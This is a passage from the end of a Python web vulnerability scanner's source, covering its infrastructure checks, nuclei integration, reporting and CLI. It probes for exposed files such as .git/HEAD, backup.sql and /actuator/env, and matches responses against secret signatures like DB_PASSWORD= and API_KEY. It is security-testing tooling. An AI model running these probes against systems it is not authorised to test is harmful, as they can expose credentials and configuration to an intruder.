    ("/.git/HEAD",         ".git directory exposed",  "CRITICAL", "CWE-538", "9.8"),
    ("/backup.zip",        "Backup archive",          "HIGH",     "CWE-538", "7.5"),
    ("/backup.sql",        "Database backup",         "CRITICAL", "CWE-538", "9.8"),
    ("/phpinfo.php",       "phpinfo() exposed",       "MEDIUM",   "CWE-200", "5.3"),
    ("/wp-config.php.bak","WordPress config backup",  "CRITICAL", "CWE-538", "9.8"),
    ("/config.json",       "Config file exposed",     "HIGH",     "CWE-200", "7.5"),
    ("/actuator",          "Spring Boot Actuator",    "HIGH",     "CWE-200", "7.5"),
    ("/actuator/env",      "Actuator env endpoint",   "CRITICAL", "CWE-200", "9.8"),
    ("/swagger.json",      "Swagger API exposed",     "LOW",      "CWE-200", "3.7"),
    ("/api-docs",          "API docs exposed",        "LOW",      "CWE-200", "3.7"),
    ("/console",           "Admin console",           "HIGH",     "CWE-284", "8.1"),
    ("/admin",             "Admin panel",             "MEDIUM",   "CWE-284", "5.3"),
    ("/server-status",     "Apache server status",    "MEDIUM",   "CWE-200", "5.3"),
    ("/.DS_Store",         "macOS DS_Store file",     "LOW",      "CWE-538", "3.7"),
    ("/robots.txt",        "robots.txt recon",        "INFO",     "CWE-200", "0.0"),
    ("/sitemap.xml",       "Sitemap recon",           "INFO",     "CWE-200", "0.0"),
]

INFRA_SIGNATURES = {
    "/.env":            ["APP_KEY=", "DB_PASSWORD=", "SECRET", "API_KEY"],
    "/.git/HEAD":       ["ref: refs/"],
    "/phpinfo.php":     ["PHP Version", "phpinfo()"],
    "/actuator":        ["_links", "health", "beans"],
    "/actuator/env":    ["activeProfiles", "propertySources"],
    "/backup.sql":      ["INSERT INTO", "CREATE TABLE"],
}

def check_infrastructure(scanner: Scanner, url: str) -> list[Finding]:
    results = []
    console.print(f"[bold]Infrastructure Misconfigurations[/bold] → {url}")
    from urllib.parse import urlparse
    base = f"{urlparse(url).scheme}://{urlparse(url).netloc}"

    for path, desc, sev, cwe, cvss in INFRA_PATHS:
        resp = scanner._get(base + path)
        if not resp or resp.status_code not in (200, 403, 302):
            continue

        # For 403 on sensitive paths — still report (resource exists, access blocked)
        if resp.status_code == 403 and sev in ("CRITICAL", "HIGH"):
            f = Finding(
                severity="INFO",
                vuln_type="Infrastructure — Sensitive Path (Access Restricted)",
                title=f"{desc} at {path} — access denied but path exists",
                url=base + path, parameter=path,
                payload=path, evidence=f"HTTP 403 — path exists",
                owasp="A05:2021 Security Misconfiguration",
                cwe=cwe, cvss="2.0",
                remediation=f"Confirm this path should not exist at all in production. Remove {path} from deployment.",
                confirmed=True,
            )
            results.append(f); scanner._add(f)
            continue

        if resp.status_code == 200:
            # Signature-based confirmation for known sensitive paths
            sigs = INFRA_SIGNATURES.get(path, [])
            confirmed = not sigs or any(sig in resp.text for sig in sigs)
            if confirmed or len(resp.text) > 20:
                f = Finding(
                    severity=sev,
                    vuln_type="Infrastructure Misconfiguration",
                    title=f"{desc} publicly accessible at {path}",
                    url=base + path, parameter=path,
                    payload=path,
                    evidence=f"HTTP 200 — {resp.text[:80].strip()}",
                    owasp="A05:2021 Security Misconfiguration",
                    cwe=cwe, cvss=cvss,
                    remediation=f"Remove or restrict access to {path}. Never deploy sensitive files to web root. Use web server deny rules.",
                    confirmed=confirmed,
                )
                results.append(f); scanner._add(f)

    if not results:
        console.print("  [green]✓ No infrastructure misconfigurations found[/green]")
    return results


# ─────────────────────────────────────────────────────────────────────────────
# 15. Nuclei Integration
# ─────────────────────────────────────────────────────────────────────────────

def run_nuclei(url: str, severity: str = "critical,high") -> list[Finding]:
    results = []
    console.print(f"\n[bold]Nuclei CVE Scan[/bold] → {url} [severity={severity}]")
    try:
        proc = subprocess.run(
            ["nuclei", "-u", url, "-severity", severity, "-json", "-silent", "-no-interactsh"],
            capture_output=True, text=True, timeout=120,
        )
        for line in proc.stdout.splitlines():
            try:
                item = json.loads(line)
                f = Finding(
                    severity=item.get("info", {}).get("severity", "HIGH").upper(),
                    vuln_type=f"CVE — {item.get('template-id', 'unknown')}",
                    title=item.get("info", {}).get("name", "Unknown"),
                    url=item.get("host", url),
                    parameter=item.get("matched-at", ""),
                    payload=item.get("template-id", ""),
                    evidence=item.get("extracted-results", [item.get("description", "")])[0] if item.get("extracted-results") else item.get("info", {}).get("description", "")[:150],
                    owasp=", ".join(item.get("info", {}).get("classification", {}).get("owasp-id", [])),
                    cwe=", ".join(item.get("info", {}).get("classification", {}).get("cwe-id", [])),
                    cvss=str(item.get("info", {}).get("classification", {}).get("cvss-score", "N/A")),
                    remediation=item.get("info", {}).get("remediation", "Apply vendor patch."),
                    confirmed=True,
                )
                results.append(f)
                color = SEVERITY_COLORS.get(f.severity, "white")
                console.print(f"  [bold {color}]{f.severity}[/bold {color}] {f.vuln_type}: {f.title[:80]}")
            except json.JSONDecodeError:
                pass
    except FileNotFoundError:
        console.print("  [yellow]nuclei not found — install with: brew install nuclei[/yellow]")
    except subprocess.TimeoutExpired:
        console.print("  [yellow]Nuclei scan timed out[/yellow]")
    if not results:
        console.print("  [green]✓ No template matches found[/green]")
    return results


# ─────────────────────────────────────────────────────────────────────────────
# Reporting
# ─────────────────────────────────────────────────────────────────────────────

def print_report(findings: list[Finding], target: str, fmt: str = "text") -> None:
    if fmt == "json":
        print(json.dumps([asdict(f) for f in findings], indent=2))
        return

    findings.sort(key=lambda x: SEVERITY_ORDER.get(x.severity, 99))

    summary = {s: sum(1 for f in findings if f.severity == s) for s in SEVERITY_ORDER}
    console.print(Panel.fit(
        f"[bold]Scan Target:[/bold] {target}\n"
        f"[bold red]Critical: {summary['CRITICAL']}[/bold red]  "
        f"[orange3]High: {summary['HIGH']}[/orange3]  "
        f"[yellow]Medium: {summary['MEDIUM']}[/yellow]  "
        f"[green]Low: {summary['LOW']}[/green]  "
        f"[cyan]Info: {summary['INFO']}[/cyan]\n"
        f"[bold]Total confirmed findings: {len(findings)}[/bold]",
        title="🔍 OpenClaw Vulnerability Scan Report",
        border_style="red" if summary["CRITICAL"] > 0 else "orange3" if summary["HIGH"] > 0 else "green",
    ))

    if not findings:
        console.print("[green]No vulnerabilities detected.[/green]")
        return

    table = Table(show_lines=True, border_style="dim", title="Findings")
    table.add_column("#", width=3)
    table.add_column("Severity", width=10)
    table.add_column("Vulnerability", width=30)
    table.add_column("Parameter", width=20)
    table.add_column("CVSS", width=6)
    table.add_column("OWASP", width=18)
    table.add_column("Evidence", width=40)

    for i, f in enumerate(findings, 1):
        color = SEVERITY_COLORS.get(f.severity, "white")
        table.add_row(
            str(i),
            f"[{color}]{f.severity}[/{color}]",
            f.vuln_type,
            f.parameter,
            f.cvss,
            f.owasp,
            f.evidence[:60],
        )
    console.print(table)

    console.print("\n[bold]Remediation Priority:[/bold]")
    for f in findings:
        if f.severity in ("CRITICAL", "HIGH"):
            console.print(f"  [{SEVERITY_COLORS[f.severity]}]●[/{SEVERITY_COLORS[f.severity]}] {f.title}")
            console.print(f"    ↳ {f.remediation}\n")


# ─────────────────────────────────────────────────────────────────────────────
# CLI
# ─────────────────────────────────────────────────────────────────────────────

ALL_CHECKS = [
    # Injection
    "sqli", "nosqli", "cmdi",
    # Server-side
    "ssrf", "xxe", "traversal", "deserialization",
    # Client-side
    "xss", "clientside",
    # Access control
    "idor",
    # Authentication
    "jwt",
    # Business logic
    "race",
    # Infrastructure
    "infra", "headers",
    # CVE scanner
    "nuclei",
]

def main() -> None:
    parser = argparse.ArgumentParser(
        description="OpenClaw Vulnerability Scanner — Active Detection & Validation (15 check categories)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Check categories:
  Injection:       sqli, nosqli, cmdi
  Server-side:     ssrf, xxe, traversal, deserialization
  Client-side:     xss, clientside (prototype pollution + DOM)
  Access Control:  idor
  Authentication:  jwt
  Business Logic:  race
  Infrastructure:  infra, headers
  CVE Templates:   nuclei

Examples:
  python3 vuln_scanner.py --url https://target.com
  python3 vuln_scanner.py --url https://target.com --checks sqli,ssrf,idor,xxe
  python3 vuln_scanner.py --url https://target.com --token eyJh... --checks jwt,idor
  python3 vuln_scanner.py --url https://target.com --checks race --workers 30
  python3 vuln_scanner.py --url https://target.com --output json > report.json
        """,
    )
    parser.add_argument("--url",      required=True,  help="Target URL to scan")
    parser.add_argument("--param",    default="id",   help="Parameter to test (default: id)")
    parser.add_argument("--value",    default="1",    help="Baseline parameter value (default: 1)")
    parser.add_argument("--token",    default="",     help="Bearer token for authenticated tests")
    parser.add_argument("--token-low",  default="",   help="Low-privilege token for IDOR priv-esc test")
    parser.add_argument("--token-high", default="",   help="High-privilege token for IDOR priv-esc test")
    parser.add_argument("--checks",   default=",".join(ALL_CHECKS),
                        help="Comma-separated checks (default: all)")
    parser.add_argument("--nuclei",   action="store_true", help="Force Nuclei CVE scan")
    parser.add_argument("--severity", default="critical,high", help="Nuclei severity (default: critical,high)")
    parser.add_argument("--workers",  type=int, default=20, help="Concurrent workers for race condition test (default: 20)")
    parser.add_argument("--output",   choices=["text", "json"], default="text")
    args = parser.parse_args()

    checks = {c.strip() for c in args.checks.split(",")}

    console.print(Panel.fit(
        f"[bold red]OpenClaw Vulnerability Scanner[/bold red]\n"
        f"[dim]Target: {args.url}[/dim]\n"
        f"[dim]Checks ({len(checks)}): {', '.join(sorted(checks))}[/dim]",
        border_style="red",
    ))

    s = Scanner(args.url, token=args.token)
    all_findings: list[Finding] = []

    # ── Injection ──────────────────────────────────────────────────────────
    if "sqli"           in checks:
        all_findings += check_sqli(s, args.url, args.param, args.value)
    if "nosqli"         in checks:
        all_findings += check_nosqli(s, args.url, args.param)
    if "cmdi"           in checks:
        all_findings += check_cmdi(s, args.url, args.param, args.value)

    # ── Server-side ────────────────────────────────────────────────────────
    if "ssrf"           in checks:
        all_findings += check_ssrf(s, args.url, args.param)
    if "xxe"            in checks:
        all_findings += check_xxe(s, args.url)
    if "traversal"      in checks:
        all_findings += check_path_traversal(s, args.url, args.param)
    if "deserialization"in checks:
        all_findings += check_deserialization(s, args.url)

    # ── Client-side ────────────────────────────────────────────────────────
    if "xss"            in checks:
        all_findings += check_xss(s, args.url, args.param)
    if "clientside"     in checks:
        all_findings += check_client_side(s, args.url, args.param)

    # ── Access Control ─────────────────────────────────────────────────────
    if "idor"           in checks:
        all_findings += check_idor(s, args.url, args.param,
                                   token_low=args.token_low,
                                   token_high=args.token_high)

    # ── Authentication ─────────────────────────────────────────────────────
    if "jwt"            in checks:
        all_findings += check_jwt_session(s, args.url, token=args.token)

    # ── Business Logic ─────────────────────────────────────────────────────
    if "race"           in checks:
        all_findings += check_race_condition(s, args.url, workers=args.workers)

    # ── Infrastructure ─────────────────────────────────────────────────────
    if "infra"          in checks:
        all_findings += check_infrastructure(s, args.url)
    if "headers"        in checks:
        all_findings += check_headers(s, args.url)

    # ── CVE Templates ──────────────────────────────────────────────────────
    if "nuclei"         in checks or args.nuclei:
        all_findings += run_nuclei(args.url, args.severity)

    print_report(all_findings, args.url, fmt=args.output)


if __name__ == "__main__":
    main()
